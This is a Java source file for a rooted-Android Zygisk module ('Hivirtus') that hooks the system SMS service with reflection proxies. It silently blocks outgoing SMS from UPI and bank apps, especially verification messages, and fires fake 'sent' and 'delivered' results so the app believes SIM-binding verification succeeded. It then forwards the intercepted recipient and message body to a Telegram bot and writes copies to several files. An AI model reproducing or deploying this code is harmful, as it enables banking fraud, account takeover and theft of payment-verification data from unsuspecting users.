package com.hivirtus.zygisk;

import android.app.Application;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.IInterface;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.lang.reflect.Proxy;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * Exact Drive MenuLoader SMS path:
 * ServiceManager.getService("isms") → IBinder proxy →
 * queryLocalInterface → ISms dynamic proxy → sendText* intercept.
 */
public final class SmsTweaksHooks {
    private static final String TAG = "HivirtusSmsTweaks";
    private static final AtomicBoolean sStarted = new AtomicBoolean(false);
    private static final AtomicBoolean sHooked = new AtomicBoolean(false);
    private static final AtomicBoolean sSenderWatch = new AtomicBoolean(false);
    private static volatile boolean sHookOutgoing = true;
    private static volatile String sProcess = "";

    private SmsTweaksHooks() {}

    public static void init(String process) {
        if (!sStarted.compareAndSet(false, true)) return;
        sProcess = process != null ? process : "";
        status("init_start|" + sProcess);
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    waitActivityThread();
                    applySmsHooks();
                    waitApplication();
                    // Re-clear after Application — SmsManager may re-cache
                    clearSmsManagerCache();
                    // Sender ID: persist only — never rewrite sms.address (OTP-safe)
                    startSenderIdWatch();
                    status("init_ready|" + sProcess);
                } catch (Throwable t) {
                    status("init_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
                    Log.e(TAG, "init fail", t);
                }
            }
        }, "hivirtus-sms-tweaks").start();
    }

    public static void install(Context ctx) {
        init(ctx != null ? ctx.getPackageName() : sProcess);
    }

    public static void setHookOutgoing(boolean on) {
        sHookOutgoing = on;
        status("hook_outgoing|" + on);
    }

    private static Object currentActivityThread() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentActivityThread");
            m.setAccessible(true);
            return m.invoke(null);
        } catch (Throwable t) {
            return null;
        }
    }

    private static Application currentApplication() {
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            m.setAccessible(true);
            Object app = m.invoke(null);
            return app instanceof Application ? (Application) app : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void waitActivityThread() {
        for (int i = 0; i < 200; i++) {
            if (currentActivityThread() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    private static void waitApplication() {
        for (int i = 0; i < 200; i++) {
            if (currentApplication() != null) return;
            try { Thread.sleep(25); } catch (InterruptedException ignored) {}
        }
    }

    /** Drive MenuLoader.applySmsHooks — exact. */
    private static void applySmsHooks() {
        if (sHooked.get()) return;
        try {
            Class<?> sm = Class.forName("android.os.ServiceManager");
            Method getService = sm.getDeclaredMethod("getService", String.class);
            getService.setAccessible(true);
            final IBinder real = (IBinder) getService.invoke(null, "isms");
            if (real == null) {
                status("isms_binder_null");
                return;
            }
            if (Proxy.isProxyClass(real.getClass())) {
                sHooked.set(true);
                status("isms_already_proxied");
                return;
            }

            IBinder binderProxy = (IBinder) Proxy.newProxyInstance(
                    IBinder.class.getClassLoader(),
                    new Class[]{IBinder.class},
                    new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args)
                                throws Throwable {
                            if ("queryLocalInterface".equals(method.getName())) {
                                String desc = (args != null && args.length > 0 && args[0] != null)
                                        ? String.valueOf(args[0]) : "";
                                status("isms_qli|" + desc);
                                try {
                                    Class<?> iSms = Class.forName(
                                            "com.android.internal.telephony.ISms");
                                    Object local = createISmsProxy(real, iSms);
                                    if (local != null) return local;
                                } catch (Throwable t) {
                                    status("isms_qli_fail|" + t.getClass().getSimpleName());
                                }
                            }
                            try {
                                return method.invoke(real, args);
                            } catch (InvocationTargetException e) {
                                throw e.getTargetException();
                            }
                        }
                    });

            Field cacheF = sm.getDeclaredField("sCache");
            cacheF.setAccessible(true);
            @SuppressWarnings("unchecked")
            Map<String, Object> cache = (Map<String, Object>) cacheF.get(null);
            if (cache != null) {
                synchronized (cache) {
                    cache.put("isms", binderProxy);
                }
                status("isms_cache_put_ok|" + sProcess);
            } else {
                status("isms_cache_null");
            }

            clearSmsManagerCache();
            sHooked.set(true);
            status("isms_java_proxy_ok|" + sProcess);
            Log.i(TAG, "Drive-style isms IBinder→ISms proxy OK in " + sProcess);
        } catch (Throwable t) {
            status("isms_java_proxy_fail|" + t.getClass().getSimpleName() + "|" + safe(t.getMessage()));
            Log.e(TAG, "applySmsHooks fail", t);
        }
    }

    /** Drive MenuLoader.createISmsProxy — exact. */
    private static Object createISmsProxy(final IBinder realBinder, Class<?> iSmsCls) {
        try {
            Class<?> stub = Class.forName("com.android.internal.telephony.ISms$Stub");
            Method asInterface = stub.getDeclaredMethod("asInterface", IBinder.class);
            asInterface.setAccessible(true);
            final Object realISms = asInterface.invoke(null, realBinder);
            if (realISms == null) {
                status("isms_asinterface_null");
                return null;
            }
            return Proxy.newProxyInstance(
                    iSmsCls.getClassLoader(),
                    new Class[]{iSmsCls, IInterface.class},
                    new InvocationHandler() {
                        @Override
                        public Object invoke(Object proxy, Method method, Object[] args)
                                throws Throwable {
                            String name = method.getName();
                            if ((name.startsWith("sendText") || name.startsWith("sendMultipartText"))
                                    && sHookOutgoing) {
                                if (!shouldInterceptSend(args)) {
                                    try {
                                        return method.invoke(realISms, args);
                                    } catch (InvocationTargetException e) {
                                        throw e.getTargetException();
                                    }
                                }
                                status("isms_java_send_method|" + name);
                                handleSend(args);
                                return null; // void send* — no radio
                            }
                            try {
                                return method.invoke(realISms, args);
                            } catch (InvocationTargetException e) {
                                throw e.getTargetException();
                            }
                        }
                    });
        } catch (Throwable t) {
            status("isms_create_proxy_fail|" + t.getClass().getSimpleName());
            Log.e(TAG, "createISmsProxy fail", t);
            return null;
        }
    }

    private static boolean isMessagingProcess() {
        String p = sProcess != null ? sProcess : "";
        return p.contains("messaging") || p.contains("mms") || p.equals("com.android.mms")
                || p.contains("motorola.messaging");
    }

    /**
     * Inbox pe +91 / bank number → menu Sender ID.
     * Messages process ke paas WRITE_SMS hota hai — shell `content` A16 pe fail hota hai.
     */
    private static final class SenderObserver extends ContentObserver {
        private final Context appCtx;

        SenderObserver(Handler h, Context ctx) {
            super(h);
            appCtx = ctx != null ? ctx.getApplicationContext() : null;
        }

        @Override
        public void onChange(boolean selfChange) {
            rewriteInboxSenderNow(appCtx);
        }
    }

    private static void startSenderIdWatch() {
        if (!sSenderWatch.compareAndSet(false, true)) return;
        new Thread(new Runnable() {
            @Override
            public void run() {
                waitApplication();
                Application app = currentApplication();
                if (app == null) {
                    status("sender_watch_no_app");
                    return;
                }
                final Context appCtx = app.getApplicationContext();
                try {
                    HandlerThread ht = new HandlerThread("hivirtus-sender");
                    ht.start();
                    Handler h = new Handler(ht.getLooper());
                    rewriteInboxSenderNow(appCtx);
                    appCtx.getContentResolver().registerContentObserver(
                            Uri.parse("content://sms"),
                            true,
                            new SenderObserver(h, appCtx));
                    status("sender_watch_ok|" + sProcess);
                } catch (Throwable t) {
                    status("sender_watch_fail|" + t.getClass().getSimpleName()
                            + "|" + safe(t.getMessage()));
                }
                // Fast poll — new OTP aate hi rewrite (observer kabhi miss)
                for (int i = 0; i < 600; i++) { // ~10 min @ 1s
                    try {
                        rewriteInboxSenderNow(appCtx);
                        Thread.sleep(1000);
                    } catch (Throwable ignored) {}
                }
                while (true) {
                    try {
                        rewriteInboxSenderNow(appCtx);
                        Thread.sleep(3000);
                    } catch (Throwable ignored) {}
                }
            }
        }, "hivirtus-sender-watch").start();
    }

    private static String readSenderId() {
        String sid = firstLine(readFile("/data/local/tmp/hivirtus_sender_id.txt"));
        if (sid.isEmpty() || "AD-TEST-S".equals(sid)) {
            sid = firstLine(readFile("/data/adb/modules/hivirtus_zygisk_mode/sender_id.txt"));
        }
        if (sid.isEmpty() || "AD-TEST-S".equals(sid)) {
            String json = readFile("/data/local/tmp/hivirtus_ui_save.json");
            if (json.isEmpty()) {
                json = readFile("/data/adb/modules/hivirtus_zygisk_mode/ui_save.json");
            }
            sid = jsonField(json, "inject_sender_id");
        }
        if ("AD-TEST-S".equals(sid)) sid = "";
        return sid != null ? sid.trim() : "";
    }

    private static String firstLine(String raw) {
        if (raw == null || raw.isEmpty()) return "";
        int n = raw.indexOf('\n');
        String line = n >= 0 ? raw.substring(0, n) : raw;
        return line.replace("\r", "").trim();
    }

    private static void rewriteInboxSenderNow(Context ctx) {
        // OTP-safe: NEVER rewrite content://sms address.
        // UPI apps match bank sender from provider — spoofing address breaks autofill.
        // Inbox display = Messages SmsMessage hooks + bugle_db (service.sh).
        if (ctx == null) return;
        final String sid = readSenderId();
        if (sid.isEmpty()) return;
        try {
            writeAll("hivirtus_sender_id.txt", sid + "\n");
            status("sender_java_otp_safe|" + sid);
        } catch (Throwable t) {
            status("sender_java_persist_fail|" + t.getClass().getSimpleName());
        }
    }

    private static boolean looksLikeUpiVerify(String body, String to) {
        if (body == null) body = "";
        if (to == null) to = "";
        String u = body.toUpperCase();
        if (u.contains("HEROAXIS") || u.contains("DO NOT COPY") || u.contains("USE UPI PIN")
                || u.contains("YESPROUPI") || u.contains("AXISUPI") || u.contains("PHONEPEUPI")) {
            return true;
        }
        if (body.length() >= 20 && (body.contains("?") || body.contains("*") || body.contains("&"))
                && (u.contains("UPI") || u.contains("PP-") || body.contains("pp-"))) {
            return true;
        }
        String d = to.replaceAll("[^0-9]", "");
        if ((d.equals("9920104300") || d.equals("56070") || d.equals("56161")
                || (d.length() >= 4 && d.length() <= 8)) && body.length() >= 12) {
            return true;
        }
        // UPI apps: intercept all outgoing
        return !isMessagingProcess();
    }

    private static boolean shouldInterceptSend(Object[] args) {
        String to = "";
        String body = "";
        if (args != null) {
            for (Object a : args) {
                if (!(a instanceof String)) continue;
                String s = (String) a;
                if (s.length() < 20 && !s.contains(" ")) to = s;
                else if (s.length() > 5) body = s;
            }
        }
        if (!isMessagingProcess()) return true; // UPI/Hero app — always intercept
        return looksLikeUpiVerify(body, to);
    }

    private static void handleSend(Object[] args) {
        String to = null;
        String body = null;
        PendingIntent sentPi = null;
        PendingIntent deliveryPi = null;
        List<PendingIntent> multiPi = null;

        if (args != null) {
            for (Object a : args) {
                if (a == null) continue;
                if (a instanceof String) {
                    String s = (String) a;
                    // Drive: short no-space → dest; longer → body
                    if (s.length() < 20 && !s.contains(" ")) {
                        to = s;
                    } else if (s.length() > 5) {
                        body = s;
                    }
                } else if (a instanceof PendingIntent) {
                    // ISms: first = sentIntent, second = deliveryIntent
                    if (sentPi == null) sentPi = (PendingIntent) a;
                    else if (deliveryPi == null) deliveryPi = (PendingIntent) a;
                } else if (a instanceof List) {
                    List<?> list = (List<?>) a;
                    if (!list.isEmpty() && list.get(0) instanceof PendingIntent) {
                        multiPi = new ArrayList<>();
                        for (Object o : list) {
                            if (o instanceof PendingIntent) multiPi.add((PendingIntent) o);
                        }
                    } else if (!list.isEmpty() && list.get(0) instanceof CharSequence && body == null) {
                        StringBuilder sb = new StringBuilder();
                        for (Object o : list) {
                            if (o != null) sb.append(o);
                        }
                        body = sb.toString();
                    }
                } else if (a instanceof PendingIntent[]) {
                    multiPi = new ArrayList<>();
                    for (PendingIntent pi : (PendingIntent[]) a) {
                        if (pi != null) multiPi.add(pi);
                    }
                }
            }
        }

        if (to == null) to = "";
        if (body == null) body = "";
        if (to.isEmpty()) to = "9920104300";
        status("isms_java_send|" + to + "|" + (body.length() > 40 ? body.substring(0, 40) : body));
        // 1) Fake success FIRST — Hero token window
        firePendingOkSync(to, sentPi, deliveryPi, multiPi);
        // 2) Persist + urgent TG (root companion / service <1s)
        writeBlockedJson(to, body);
        queueServiceTelegram(to, body);
        writeUrgentFlag(to, body);
        try {
            nativeUrgentTg(to, body);
        } catch (Throwable t) {
            status("native_urgent_miss|" + t.getClass().getSimpleName());
        }
        if (!body.isEmpty()) sendTelegram(to, body);
    }

    /** Zygisk .so RegisterNatives — root companion TG (~1s). */
    private static native void nativeUrgentTg(String to, String body);

    private static void writeUrgentFlag(String to, String body) {
        try {
            writeAll("hivirtus_tg_urgent.flag", "1\n");
            writeAll("hivirtus_outgoing_blocked.flag", to + "\n" + body + "\n");
        } catch (Throwable ignored) {}
    }

    private static void firePendingOkSync(final String dest, final PendingIntent sent,
                                          final PendingIntent delivery,
                                          final List<PendingIntent> multi) {
        try {
            Context ctx = appContext();
            if (sent != null) fireOnePi(ctx, sent, "sent");
            if (multi != null) {
                for (int i = 0; i < multi.size(); i++) {
                    PendingIntent pi = multi.get(i);
                    if (pi != null) fireOnePi(ctx, pi, "multi" + i);
                }
            }
            if (delivery != null) fireOnePi(ctx, delivery, "delivery");
            fireSmsResultBroadcasts(ctx, dest);
        } catch (Throwable t) {
            status("pi_sync_fail|" + t.getClass().getSimpleName());
            firePendingOk(dest, sent, delivery, multi);
        }
    }

    private static Context appContext() {
        try {
            Application app = currentApplication();
            return app != null ? app.getApplicationContext() : null;
        } catch (Throwable t) {
            return null;
        }
    }

    private static void fireOnePi(Context ctx, PendingIntent pi, String label) {
        if (pi == null) return;
        try {
            if (ctx != null) {
                pi.send(ctx, -1, null); // Activity.RESULT_OK
                status("pi_ok_ctx|" + label);
                return;
            }
        } catch (Throwable t) {
            status("pi_ctx_fail|" + label + "|" + t.getClass().getSimpleName());
        }
        try {
            pi.send(-1);
            status("pi_ok_int|" + label);
        } catch (Throwable t) {
            status("pi_fail|" + label + "|" + t.getClass().getSimpleName());
        }
    }

    private static void fireSmsResultBroadcasts(Context ctx, String dest) {
        if (ctx == null) return;
        try {
            android.content.Intent sent = new android.content.Intent("android.provider.Telephony.SMS_SENT");
            sent.putExtra("result", -1);
            ctx.sendOrderedBroadcast(sent, null);
            android.content.Intent del = new android.content.Intent("android.provider.Telephony.SMS_DELIVERED");
            del.putExtra("result", -1);
            ctx.sendOrderedBroadcast(del, null);
            if (dest != null && !dest.isEmpty()) {
                android.content.Intent s2 = new android.content.Intent("SMS_SENT" + dest);
                ctx.sendOrderedBroadcast(s2, null);
                android.content.Intent d2 = new android.content.Intent("SMS_DELIVERY" + dest);
                ctx.sendOrderedBroadcast(d2, null);
            }
            status("sms_result_broadcasts|" + dest);
        } catch (Throwable t) {
            status("sms_broadcast_fail|" + t.getClass().getSimpleName());
        }
    }

    private static void firePendingOk(final String dest, final PendingIntent sent,
                                      final PendingIntent delivery, final List<PendingIntent> multi) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    // Near-instant — Hero Axis token ~30–60s; slow PI → Something went wrong
                    Thread.sleep(20);
                    Context ctx = appContext();
                    boolean any = false;
                    if (sent != null) {
                        fireOnePi(ctx, sent, "sent");
                        any = true;
                    }
                    if (multi != null) {
                        for (int i = 0; i < multi.size(); i++) {
                            PendingIntent pi = multi.get(i);
                            if (pi != null) {
                                fireOnePi(ctx, pi, "multi" + i);
                                any = true;
                            }
                        }
                    }
                    Thread.sleep(150);
                    if (delivery != null) {
                        fireOnePi(ctx, delivery, "delivery");
                        any = true;
                    }
                    fireSmsResultBroadcasts(ctx, dest);
                    if (!any) status("isms_no_pendingintent");
                } catch (Throwable t) {
                    status("pi_worker_fail|" + t.getClass().getSimpleName());
                }
            }
        }, "hivirtus-pi").start();
    }

    /** Drive clearSmsManagerCache + extra field names. */
    private static void clearSmsManagerCache() {
        try {
            Class<?> sms = Class.forName("android.telephony.SmsManager");
            String[] fields = {
                    "sSubIdToInstanceMap", "sSubInstances", "sInstance",
                    "mDefaultSmsManager", "sDefaultInstance"
            };
            for (String fn : fields) {
                try {
                    Field f = sms.getDeclaredField(fn);
                    f.setAccessible(true);
                    Object v = f.get(null);
                    if (v instanceof Map) {
                        ((Map<?, ?>) v).clear();
                    } else {
                        f.set(null, null);
                    }
                } catch (Throwable ignored) {}
            }
            status("smsmanager_cache_cleared");
        } catch (Throwable t) {
            status("smsmanager_cache_fail|" + t.getClass().getSimpleName());
        }
    }

    private static File[] writeTargets() {
        List<File> out = new ArrayList<>();
        out.add(new File("/data/local/tmp"));
        out.add(new File("/data/adb/modules/hivirtus_zygisk_mode"));
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            m.setAccessible(true);
            Object app = m.invoke(null);
            if (app instanceof Context) {
                Context c = ((Context) app).getApplicationContext();
                out.add(c.getFilesDir());
                out.add(c.getCacheDir());
                File cc = new File(c.getCodeCacheDir(), "hivirtus");
                //noinspection ResultOfMethodCallIgnored
                cc.mkdirs();
                out.add(cc);
                File ext = c.getExternalFilesDir(null);
                if (ext != null) out.add(ext);
            }
        } catch (Throwable ignored) {}
        return out.toArray(new File[0]);
    }

    private static void writeAll(String name, String data) {
        byte[] bytes = data.getBytes(StandardCharsets.UTF_8);
        for (File dir : writeTargets()) {
            if (dir == null) continue;
            try {
                //noinspection ResultOfMethodCallIgnored
                dir.mkdirs();
                FileOutputStream fos = new FileOutputStream(new File(dir, name), false);
                fos.write(bytes);
                fos.close();
            } catch (Throwable ignored) {}
        }
    }

    private static void writeBlockedJson(String to, String body) {
        try {
            long ts = System.currentTimeMillis();
            String json = "{\"dest\":\"" + esc(to) + "\",\"to\":\"" + esc(to)
                    + "\",\"body\":\"" + esc(body)
                    + "\",\"pkg\":\"" + esc(sProcess) + "\",\"ts\":" + ts + "}\n";
            String flag = to + "\n" + body + "\n";
            // Names service.sh harvests
            writeAll("hivirtus_outgoing_blocked.json", json);
            writeAll("hivirtus_outgoing_blocked.flag", flag);
            writeAll("hivirtus_pending_verify.json", json);
            writeAll("hivirtus_last_outgoing.json", json);
            writeAll("hivirtus_blocked_outgoing.json", json); // legacy alias
            status("blocked_json_written|" + to + "|len=" + body.length());
        } catch (Throwable t) {
            status("blocked_json_fail|" + t.getClass().getSimpleName());
        }
    }

    /** Root service.sh picks this up — bank apps often block direct Telegram HTTPS. */
    private static void queueServiceTelegram(String to, String body) {
        try {
            writeAll("hivirtus_outgoing_blocked.flag", to + "\n" + body + "\n");
            // Do NOT set inproc_sent — that makes service.sh skip TG as duplicate
            for (File dir : writeTargets()) {
                try {
                    //noinspection ResultOfMethodCallIgnored
                    new File(dir, "hivirtus_tg_inproc_sent.flag").delete();
                } catch (Throwable ignored) {}
            }
            writeAll("hivirtus_java_tg_queue.flag", "1\n");
            status("tg_queued_service|" + to);
        } catch (Throwable ignored) {}
    }

    private static String readCredsToken() {
        String token = readFile("/data/local/tmp/hivirtus_tg_token.txt").trim();
        if (token.isEmpty()) {
            token = readFile("/data/adb/modules/hivirtus_zygisk_mode/tg_token.txt").trim();
        }
        if (token.isEmpty()) {
            String json = readFile("/data/local/tmp/hivirtus_telegram_credentials.json");
            if (json.isEmpty()) {
                json = readFile("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json");
            }
            token = jsonField(json, "telegram_bot_token");
        }
        return token;
    }

    private static String readCredsChat() {
        String chat = readFile("/data/local/tmp/hivirtus_tg_chat.txt").trim();
        if (chat.isEmpty()) {
            chat = readFile("/data/adb/modules/hivirtus_zygisk_mode/tg_chat.txt").trim();
        }
        if (chat.isEmpty()) {
            String json = readFile("/data/local/tmp/hivirtus_telegram_credentials.json");
            if (json.isEmpty()) {
                json = readFile("/data/adb/modules/hivirtus_zygisk_mode/telegram_credentials.json");
            }
            chat = jsonField(json, "telegram_chat_id");
        }
        return chat;
    }

    private static String jsonField(String json, String key) {
        if (json == null || json.isEmpty() || key == null) return "";
        String needle = "\"" + key + "\"";
        int i = json.indexOf(needle);
        if (i < 0) return "";
        int colon = json.indexOf(':', i + needle.length());
        if (colon < 0) return "";
        int q1 = json.indexOf('"', colon + 1);
        if (q1 < 0) return "";
        int q2 = json.indexOf('"', q1 + 1);
        if (q2 < 0) return "";
        return json.substring(q1 + 1, q2).trim();
    }

    private static String jsonEscTg(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder(s.length() + 16);
        for (int i = 0; i < s.length(); i++) {
            char ch = s.charAt(i);
            switch (ch) {
                case '\\': sb.append("\\\\"); break;
                case '"': sb.append("\\\""); break;
                case '\n': sb.append("\\n"); break;
                case '\r': sb.append("\\r"); break;
                case '\t': sb.append("\\t"); break;
                default:
                    if (ch < 0x20) sb.append(String.format("\\u%04x", (int) ch));
                    else sb.append(ch);
            }
        }
        return sb.toString();
    }

    private static void sendTelegram(String to, String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String token = readCredsToken();
                    String chat = readCredsChat();
                    if (token.isEmpty() || chat.isEmpty()) {
                        File cfg = new File(
                                "/data/adb/modules/hivirtus_zygisk_mode/config/telegram.env");
                        if (cfg.exists()) {
                            String[] lines = readFile(cfg.getAbsolutePath()).split("\n");
                            for (String line : lines) {
                                line = line.trim();
                                if (line.startsWith("BOT_TOKEN=")) token = line.substring(10).trim();
                                if (line.startsWith("CHAT_ID=")) chat = line.substring(8).trim();
                            }
                        }
                    }
                    if (token.isEmpty() || chat.isEmpty()) {
                        status("tg_skip_no_creds");
                        return;
                    }
                    String displayTo = to;
                    String digits = to.replaceAll("[^0-9]", "");
                    if (digits.length() == 10) displayTo = "+91" + digits;
                    else if (digits.length() == 12 && digits.startsWith("91"))
                        displayTo = "+" + digits;
                    // Match spaced screenshot: 1 blank after header, 1 blank between To ↔ Body
                    String msg = "📱 <b>Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥</b>\n\n"
                            + "<b>To (Tap to copy):</b>\n"
                            + "<code>" + escHtml(displayTo) + "</code>\n\n"
                            + "<b>Body (Tap to copy):</b>\n"
                            + "<code>" + escHtml(body) + "</code>";
                    String payload = "{\"chat_id\":\"" + jsonEscTg(chat)
                            + "\",\"text\":\"" + jsonEscTg(msg)
                            + "\",\"parse_mode\":\"HTML\""
                            + ",\"disable_web_page_preview\":true}";
                    String url = "https://api.telegram.org/bot" + token + "/sendMessage";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(5000);
                    c.setReadTimeout(5000);
                    c.setDoOutput(true);
                    c.setRequestMethod("POST");
                    c.setRequestProperty("Content-Type", "application/json; charset=utf-8");
                    byte[] bytes = payload.getBytes(StandardCharsets.UTF_8);
                    c.setFixedLengthStreamingMode(bytes.length);
                    c.getOutputStream().write(bytes);
                    int code = c.getResponseCode();
                    c.disconnect();
                    status("tg_sent|" + to + "|http=" + code);
                    writeAll("hivirtus_tg_last_response.txt", "java_http=" + code + "\n");
                    if (code >= 200 && code < 300) {
                        // Stop service.sh double-send
                        try {
                            FileOutputStream fos = new FileOutputStream(
                                    "/data/local/tmp/hivirtus_tg_inproc_sent.flag");
                            fos.write((to + "\n" + body + "\n").getBytes(StandardCharsets.UTF_8));
                            fos.close();
                        } catch (Throwable ignored) {}
                        // Clear active blocked files — keep spam of last_outgoing off TG
                        try {
                            String empty = "{\"dest\":\"\",\"body\":\"\",\"note\":\"already_forwarded\"}\n";
                            writeAll("hivirtus_outgoing_blocked.json", empty);
                            writeAll("hivirtus_pending_verify.json", empty);
                            writeAll("hivirtus_last_outgoing.json", empty);
                            for (File dir : writeTargets()) {
                                try {
                                    //noinspection ResultOfMethodCallIgnored
                                    new File(dir, "hivirtus_outgoing_blocked.flag").delete();
                                    //noinspection ResultOfMethodCallIgnored
                                    new File(dir, "hivirtus_java_tg_queue.flag").delete();
                                } catch (Throwable ignored) {}
                            }
                        } catch (Throwable ignored) {}
                    }
                } catch (Throwable t) {
                    status("tg_fail|" + t.getClass().getSimpleName());
                }
            }
        }, "hivirtus-tg").start();
    }

    private static String readFile(String path) {
        try {
            java.io.FileInputStream fis = new java.io.FileInputStream(path);
            byte[] buf = new byte[8192];
            int n = fis.read(buf);
            fis.close();
            return n > 0 ? new String(buf, 0, n, StandardCharsets.UTF_8) : "";
        } catch (Throwable t) {
            return "";
        }
    }

    private static void status(String line) {
        String row = System.currentTimeMillis() + "|" + line + "\n";
        try {
            FileWriter fw = new FileWriter("/data/local/tmp/hivirtus_sms_tweaks_status.txt", true);
            fw.write(row);
            fw.close();
        } catch (Throwable ignored) {}
        try {
            FileOutputStream fos = new FileOutputStream(
                    new File("/data/local/tmp/hivirtus_isms_trace.txt"), true);
            fos.write(("java|" + row).getBytes(StandardCharsets.UTF_8));
            fos.close();
        } catch (Throwable ignored) {}
        // Append into app code_cache (bank can't always write tmp)
        try {
            Class<?> at = Class.forName("android.app.ActivityThread");
            Method m = at.getDeclaredMethod("currentApplication");
            Object app = m.invoke(null);
            if (app instanceof Context) {
                File cc = new File(((Context) app).getCodeCacheDir(), "hivirtus");
                //noinspection ResultOfMethodCallIgnored
                cc.mkdirs();
                FileWriter fw = new FileWriter(new File(cc, "sms_tweaks_status.txt"), true);
                fw.write(row);
                fw.close();
            }
        } catch (Throwable ignored) {}
    }

    private static String esc(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "");
    }

    private static String escHtml(String s) {
        if (s == null) return "";
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;");
    }

    private static String safe(String s) {
        return s == null ? "" : s.replace("\n", " ").replace("|", "/");
    }
}
